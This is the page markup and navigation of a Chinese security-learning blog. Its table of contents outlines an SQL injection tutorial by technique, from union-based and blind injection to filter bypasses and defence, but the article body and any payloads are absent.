class="next_info">基于xss-lab的绕过</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/05/09/sqlilabs%201-22%E5%85%B3%E6%80%9D%E8%B7%AF/" title="sqlilabs 1-22关思路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-09</div><div class="title">sqlilabs 1-22关思路</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">这个世界值得我们无限探索</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">Attackxu</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hhhanxx" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/487720257" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">判断是否存在注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">判断闭合方式：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">判断SQL注入的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">数字型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">字符型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.4.</span> <span class="toc-text">判断表中字段数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="toc-number">1.5.</span> <span class="toc-text">确定显示位</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.1.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">判断是否存在注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.1.3.</span> <span class="toc-text">获取数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">获取数据库名长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">获取数据库名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.4.</span> <span class="toc-text">获取表名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">获取表的数量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">获取表名长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B7%E4%BD%93%E8%A1%A8%E5%90%8D"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">获取具体表名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E5%88%97%E5%90%8D%EF%BC%89"><span class="toc-number">2.1.5.</span> <span class="toc-text">获取字段名（列名）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9F%90%E4%B8%AA%E8%A1%A8%E4%B8%AD%E6%9C%89%E5%A4%9A%E5%B0%91%E5%88%97"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">获取某个表中有多少列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">获取列名长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">获取列名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%AE%B0%E5%BD%95"><span class="toc-number">2.1.6.</span> <span class="toc-text">获取记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%88%97%E4%B8%AD%E6%9C%89%E5%A4%9A%E5%B0%91%E8%A1%8C%E8%AE%B0%E5%BD%95"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">获取列中有多少行记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%AE%B0%E5%BD%95%E9%95%BF%E5%BA%A6"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">获取记录长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE"><span class="toc-number">2.1.6.3.</span> <span class="toc-text">获取具体数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.1.</span> <span class="toc-text">时间盲注函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5-2"><span class="toc-number">2.2.3.</span> <span class="toc-text">判断是否存在注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="toc-number">2.2.4.</span> <span class="toc-text">获取数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6-1"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">获取数据库名长度</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">报错注入函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-2"><span class="toc-number">3.3.</span> <span class="toc-text">注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.3.1.</span> <span class="toc-text">判断是否存在注入，注入类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-3"><span class="toc-number">3.3.2.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E8%A1%A8%E5%90%8D"><span class="toc-number">3.3.3.</span> <span class="toc-text">获取数据库中表名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%87%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">3.3.3.1.</span> <span class="toc-text">遇见问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">3.3.4.</span> <span class="toc-text">获取表中字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E8%AE%B0%E5%BD%95"><span class="toc-number">3.3.5.</span> <span class="toc-text">获取表中记录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-3"><span class="toc-number">4.2.</span> <span class="toc-text">注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.1.</span> <span class="toc-text">判断注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BD%BF%E7%94%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">4.2.2.</span> <span class="toc-text">注入（使用联合查询注入）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%8C%E6%BA%90%E7%A0%81%E4%B8%AD%E6%9C%89%E5%AF%B9%E5%BA%94%E7%9A%84%E8%BD%AC%E4%B9%89%EF%BC%88magic-quotes-gpc%EF%BC%88%E9%AD%94%E6%9C%AF%E5%BC%95%E5%8F%B7%E8%BD%AC%E4%B9%89%EF%BC%89%EF%BC%89%E6%88%96%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E5%87%BD%E6%95%B0%EF%BC%88addslashes%EF%BC%89"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">实现二次注入，源码中有对应的转义（&lt;font style&#x3D;&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;magic_quotes_gpc（魔术引号转义）&lt;&#x2F;font&gt;）或使用转义函数（&lt;font style&#x3D;&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;addslashes&lt;&#x2F;font&gt;）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">常见过滤和绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">8.1.</span> <span class="toc-text">关键字被过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">8.2.</span> <span class="toc-text">函数被过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">8.3.</span> <span class="toc-text">注释符被过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">8.4.</span> <span class="toc-text">单引号被过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">9.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tips"><span class="toc-number">10.</span> <span class="toc-text">Tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95"><span class="toc-number">10.1.</span> <span class="toc-text">万能密码登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81head%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">10.2.</span> <span class="toc-text">常见head头注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%B1%8F%E8%94%BD%E4%BA%86%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E6%98%BE%E7%A4%BA%EF%BC%8C%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">10.3.</span> <span class="toc-text">如果屏蔽了错误信息显示，如何判断是否存在注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99shell%E6%9D%A1%E4%BB%B6"><span class="toc-number">10.4.</span> <span class="toc-text">写shell条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.4.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/" title="流量特征">流量特征</a><time datetime="2025-05-27T11:58:51.000Z" title="发表于 2025-05-27 19:58:51">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/src%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84http%E8%AF%B7%E6%B1%82%E5%A4%B4%E9%97%AE%E9%A2%98/" title="src中遇到的http请求头问题">src中遇到的http请求头问题</a><time datetime="2025-05-27T11:57:04.000Z" title="发表于 2025-05-27 19:57:04">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2025-05-27T11:55:58.000Z" title="发表于 2025-05-27 19:55:58">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/SpringBoot/" title="SpringBoot">SpringBoot</a><time datetime="2025-05-27T11:55:22.000Z" title="发表于 2025-05-27 19:55:22">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/Maven/" title="Maven">Maven</a><time datetime="2025-05-27T11:55:04.000Z" title="发表于 2025-05-27 19:55:04">2025-05-27</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="Attackxu" target="_blank">Attackxu</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">6</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 0.88rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 0.88rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 0.88rem;">HTTP<sup>4</sup></a><a href="/tags/JAVA/" style="font-size: 0.88rem;">JAVA<sup>6</sup></a><a href="/tags/JavaScript/" style="font-size: 0.88rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 0.88rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 0.88rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 0.88rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">sql注入<sup>2</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 0.88rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 0.88rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>7</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" 